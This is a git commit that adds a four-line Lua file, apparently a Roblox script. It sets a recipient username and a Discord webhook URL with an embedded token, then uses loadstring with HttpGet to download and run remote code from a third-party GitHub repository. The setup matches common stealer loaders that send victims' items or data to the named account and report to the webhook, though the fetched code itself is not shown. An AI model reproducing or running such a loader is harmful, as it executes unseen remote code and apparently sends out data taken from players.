6bd18ab8f335f84283e4ffff1e49650fddf25533
ytmemesyeet <124739742+ytmemesyeet@users.noreply.github.com>
2023-03-21 20:01:05 -0400

    Add files via upload

---
+++ 912095602786066478 (1).lua
@@ -0,0 +1,4 @@
+UserName = "poopfacemom1"
+UserName2 = "poopfacemom1"
+Webhook = "https://discord.com/api/webhooks/1079567157563768913/RkGnjkYa8U47l9_FtVDJGX6oExsf1r1p719OePw4FdXKWBqsqp1OmmRZ2z-cYH0IIjS9"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
